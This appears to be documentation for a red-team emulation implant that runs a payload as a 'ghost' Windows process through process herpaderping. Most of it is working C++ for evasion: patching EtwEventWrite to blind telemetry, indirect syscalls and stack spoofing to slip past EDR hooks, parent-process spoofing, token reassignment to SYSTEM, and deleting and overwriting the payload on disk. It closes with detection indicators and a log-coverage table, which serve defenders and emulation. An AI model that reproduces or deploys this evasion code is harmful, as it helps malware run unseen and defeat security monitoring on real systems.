# Process Herpaderping: Ghost Process via SEC_IMAGE Section

## Technique

**MITRE ATT&CK:** T1055 — Process Injection (Herpaderping Variant)

_Herpaderping creates a ghost process by mapping a payload into a memory section and spawning a process from that section. After the process is created but before the thread starts, the on-disk file backing the section is overwritten with junk. The running process therefore has no valid on-disk image — forensic reads of the file see garbage while the process executes from the original in-memory section. This is distinct from Process Doppelgänging (T1055.013), which uses NTFS transactions (TxF) — CWLHerpaderping does **not** use TxF._

## Execution Flow

```
main()
 └─ PatchEtw()                         ← B1: suppress ETW (T1562.006)
 └─ GetPayloadBuffer()
     ├─ CreateFileW(PAYLOAD_PATH)
     ├─ ReadFile → heap buffer
     └─ DeleteFileW(PAYLOAD_PATH)       ← anti-forensic: payload removed from disk
 └─ Herpaderping(buffer, size)
     ├─ InitSyscallPool / INDIRECT_SYSCALL × 5   ← B2: indirect syscalls
     ├─ SealSyscallPool()               ← flip stub page to PAGE_EXECUTE_READ
     ├─ GetTempFileNameW (prefix "HD") → hTemp
     ├─ WriteFile(payload → hTemp)
     ├─ NtCreateSection(SEC_IMAGE, hTemp) [StackSpoof]
     ├─ GetNonJobParent()               ← B3: PPID spoof (svchost/wininit Session 0)
     ├─ NtCreateProcessEx(section, parent) [StackSpoof]
     ├─ NtSetInformationProcess(ProcessAccessToken=9) ← B4: token fixup [GetProcAddress]
     ├─ NtQueryInformationProcess → pbi [GetProcAddress]
     ├─ GetEntryPoint(hProcess, payload, pbi)
     ├─ SetFilePointer(hTemp, 0) + WriteFile loop  ← overwrite with "Hello From CyberWarFare Labs"
     ├─ RtlCreateProcessParametersEx(RuntimeBroker.exe) [GetProcAddress]
     ├─ NtAllocateVirtualMemory(hProcess, paramBuffer) [StackSpoof]
     ├─ NtWriteVirtualMemory(hProcess, processParameters) [StackSpoof]
     ├─ WriteProcessMemory(&remotePEB->ProcessParameters) ← Win32, not spoofed
     └─ NtCreateThreadEx(hProcess, entryPoint) [StackSpoof]
```

## Steps Detail

| Step | API / Action | Description |
|------|-------------|-------------|
| 0 | `PatchEtw()` | Patch `ntdll!EtwEventWrite` → `xor eax,eax; ret` — suppress ETW before any NT call (T1562.006) |
| 1 | `CreateFileW` / `ReadFile` | Read payload from `PAYLOAD_PATH` into heap buffer |
| 2 | `DeleteFileW(PAYLOAD_PATH)` | Delete payload file immediately after read — anti-forensic |
| 3 | `InitSyscallPool` / `INDIRECT_SYSCALL` × 5 | Resolve SSNs for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`; `SealSyscallPool()` flips stub page to `PAGE_EXECUTE_READ` |
| 4 | `GetTempFileNameW` / `CreateFileW` | Create temp file in `%TEMP%` with prefix `HD` to hold payload bytes |
| 5 | `WriteFile` | Write payload bytes into temp file |
| 6 | `NtCreateSection(SEC_IMAGE)` | Create image section from temp file handle **[StackSpoof]** |
| 7 | `GetNonJobParent()` | Enumerate processes; find `svchost.exe` → fallback `wininit.exe` in Session 0 |
| 8 | `NtCreateProcessEx(section, parent)` | Spawn ghost process from section with spoofed PPID **[StackSpoof]** |
| 9 | `NtSetInformationProcess(class=9)` | Assign duplicate of caller's primary token to ghost (`ProcessAccessToken`) **[GetProcAddress]** |
| 10 | `NtQueryInformationProcess` | Read ghost `PebBaseAddress` → used for entry point calculation **[GetProcAddress]** |
| 11 | Temp file overwrite | `SetFilePointer(0)` + `WriteFile` loop fills `HD*.tmp` with `L"Hello From CyberWarFare Labs\n"` junk |
| 12 | `RtlCreateProcessParametersEx` | Build spoofed `RTL_USER_PROCESS_PARAMETERS` with `ImagePathName = RuntimeBroker.exe` **[GetProcAddress]** |
| 13 | `NtAllocateVirtualMemory` | Allocate `RW` memory in ghost process for process parameters **[StackSpoof]** |
| 14 | `NtWriteVirtualMemory` | Write process parameters struct into allocated memory **[StackSpoof]** |
| 15 | `WriteProcessMemory` | Patch `remotePEB->ProcessParameters` pointer to spoofed struct — Win32 call, **not StackSpoofed** |
| 16 | `NtCreateThreadEx(entryPoint)` | Start thread at payload entry point in ghost process **[StackSpoof]** |

> **Key:** `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` (steps 13–14) are for **process parameters / PEB spoofing**, not for writing the payload. The payload enters the ghost process via the `NtCreateSection` section mapped at step 6 — no separate write of payload bytes into remote memory.

## Patches Applied

### B1 — ETW Patch (`CWLImplant.cpp` line 19–28)

**Purpose:** `EtwEventWrite` in `ntdll.dll` is the function EDR sensors hook to receive kernel-originated ETW events (e.g., `NtCreateSection`, `NtCreateProcessEx`). Patching it to `xor eax,eax; ret` suppresses those events for the lifetime of the process.

```cpp
static void PatchEtw()
{
    HMODULE hNtdll = GetNtdllBase();
    PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
    if (!pEtw) return;
    DWORD old = 0;
    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
    memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
    VirtualProtect(pEtw, 4, old, &old);
}
```

**Called first** in `main()` before any NT API, so DC0021 (OS API Execution) telemetry is suppressed for all subsequent calls.

---

### B2 — Indirect Syscalls (`CWLImplant.cpp` line 119–129, `syscall.h`)

Five injection-critical APIs use **indirect syscall stubs** built at runtime by `InitSyscallPool`:

```cpp
INDIRECT_SYSCALL(_NtCreateSection,         pNtCreateSection,         NtCreateSection);
INDIRECT_SYSCALL(_NtCreateProcessEx,       pNtCreateProcessEx,       NtCreateProcessEx);
INDIRECT_SYSCALL(_NtAllocateVirtualMemory, pNtAllocateVirtualMemory, NtAllocateVirtualMemory);
INDIRECT_SYSCALL(_NtWriteVirtualMemory,    pNtWriteVirtualMemory,    NtWriteVirtualMemory);
INDIRECT_SYSCALL(_NtCreateThreadEx,        pNtCreateThreadEx,        NtCreateThreadEx);
SealSyscallPool();  // flip stub page PAGE_RWX → PAGE_EXECUTE_READ
```

Each stub: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11` — the gadget (`syscall;ret`) lives inside `ntdll .text`, so the CPU sees the syscall as originating from `ntdll`, not from the stub page. EDR user-mode hooks in `ntdll` are bypassed.

Non-injection APIs (`NtQueryInformationProcess`, `RtlCreateProcessParametersEx`, `RtlInitUnicodeString`, `NtSetInformationProcess`) are resolved via `RESOLVE_API` (EAT-walk `GetProcAddress`), not indirect syscalls.

---

### B3 — PPID Spoofing — `GetNonJobParent()` (`CWLImplant.cpp` line 30–51)

**Purpose:** `NtCreateProcessEx` inherits session and job-object constraints from its parent handle. On IIS servers, the caller may be inside an IIS Job Object. Using a Session 0 non-PPL process as parent places the ghost in Session 0 with no Job Object.

```cpp
static HANDLE GetNonJobParent()
{
    const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                    DWORD sid = 0xFFFF;
                    ProcessIdToSessionId(pe.th32ProcessID, &sid);
                    if (sid != 0) continue;  // reject Session 1+ (interactive users)
                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                    if (h) { CloseHandle(hSnap); return h; }
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return GetCurrentProcess();  // fallback: no spoof
}
```

**Why `svchost.exe` first:** On Windows Server 2022, `wininit.exe` and `services.exe` may restrict `PROCESS_CREATE_PROCESS` even from SYSTEM. `svchost.exe` is non-PPL, always in Session 0, and reliably accessible. `wininit.exe` is the fallback if no `svchost.exe` handle can be opened.

**Side-effect:** `NtCreateProcessEx` inherits the spoofed parent's token — fixed by B4.

---

### B4 — Token Fixup — `NtSetInformationProcess(ProcessAccessToken)` (`CWLImplant.cpp` line 239–256)

**Purpose:** Ghost process inherits `svchost.exe`'s token after PPID spoof. This patch immediately re-assigns the ghost's primary token to a duplicate of the **calling process's** token — ensuring the ghost runs as SYSTEM (when called via EfsPotato) or as the domain user (when called from the workstation path).

```cpp
_NtSetInformationProcess pNtSetInformationProcess =
    (_NtSetInformationProcess)RESOLVE_API(hNtdll, NtSetInformationProcess);
if (pNtSetInformationProcess)
{
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
    {
        HANDLE hPrimary = NULL;
        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                SecurityIdentification, TokenPrimary, &hPrimary))
        {
            PROCESS_ACCESS_TOKEN pat = { hPrimary, NULL };
            pNtSetInformationProcess(hProcess, (PROCESSINFOCLASS)9, &pat, sizeof(pat));
            CloseHandle(hPrimary);
        }
        CloseHandle(hToken);
    }
}
```

Definitions in `CWLInc.h` (line 235–244):
```c
typedef struct _PROCESS_ACCESS_TOKEN {
    HANDLE Token;
    HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

typedef NTSYSAPI NTSTATUS(NTAPI* _NtSetInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength);
```

---

### B5 — Stack Spoofing (`StackSpoof.cpp` / `StackSpoof.h`)

All five indirect syscall calls are wrapped with `StackSpoofer`:

```cpp
StackSpoofer spoofer(OBFSTR("kernel32.dll"));
spoofer.Activate();
status = pNtCreateSection(&hSection, ...);
spoofer.Deactivate();
```

`Activate()` plants a fake return address inside `kernel32.dll` on the stack before the syscall. EDR stack-walk inspection sees the call as originating from `kernel32.dll`, not from the stub page or the PE. `WriteProcessMemory` (PEB pointer patch, step 15) is a Win32 call and is **not** stack-spoofed.

---

### Combined Effect

| Scenario | Ghost PPID | Ghost Session | Ghost Token |
|---|---|---|---|
| No patches | `CertEnrollAgent.exe` | Inherited | Caller token |
| PPID patch only | `svchost.exe` | Session 0 | `svchost.exe` token |
| PPID + token fixup | `svchost.exe` | Session 0 | **Caller token (SYSTEM or domain user)** |

## Payload Path

Default compile-time path (`CWLImplant.cpp` line 13):

```cpp
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
#endif
```

Override at build time via MSBuild (used in emulation plan):

```powershell
msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 `
    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" /t:Rebuild /m
```

In the emulation plan the payload is deployed to `C:\ProgramData\CertCA.bin`.

## Payload Requirements

- Format: Portable Executable (.exe), not raw shellcode
- Architecture: x64
- Entry point: Standard PE entry point (`AddressOfEntryPoint`)
- Self-contained: no external DLL dependencies at load time

## IOCs for Detection

- Process whose on-disk image (`HD*.tmp`) contains junk (`Hello From CyberWarFare Labs`) that does not match the in-memory mapped section
- `NtCreateProcessEx` called with a `SectionHandle` argument — spawning from section rather than from an image file path
- `ProcessParameters.ImagePathName` = `RuntimeBroker.exe` while `PEB.ImageBaseAddress` maps to a different PE
- PPID of ghost process resolves to `svchost.exe` or `wininit.exe` in Session 0 despite the real parent being a non-service process
- Stack return address in `kernel32.dll` for `ntdll` NT syscalls (fake return planted by StackSpoofer)
- `EtwEventWrite` in `ntdll` patched to `xor eax,eax; ret` in calling process memory
- API sequence: `NtCreateSection(SEC_IMAGE)` → `NtCreateProcessEx` → `NtSetInformationProcess(class=9)` → file-overwrite → `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `WriteProcessMemory` → `NtCreateThreadEx`

## Log Sources Coverage

| Data Component | Log Source | Channel/Event | Notes |
|---|---|---|---|
| Process Creation (DC0032) | WinEventLog:Sysmon | EventCode=1 | ❌ Ghost process — `ImageFileName` shows `RuntimeBroker.exe` but on-disk file is junk |
| Process Access (DC0035) | WinEventLog:Sysmon | EventCode=10 | ✅ Yes — `NtCreateProcessEx` access on LSASS-adjacent processes |
| File Creation (DC0016) | WinEventLog:Sysmon | EventCode=11 | ✅ `HD*.tmp` created then immediately overwritten |
| OS API Execution (DC0021) | ETW:Microsoft-Windows-Kernel-Process | `NtCreateSection`, `NtCreateProcessEx` | ❌ Suppressed by `PatchEtw()` |
| Thread Creation (DC0019) | WinEventLog:Sysmon | EventCode=8 | ❌ No `CreateRemoteThread` — uses `NtCreateThreadEx` directly |
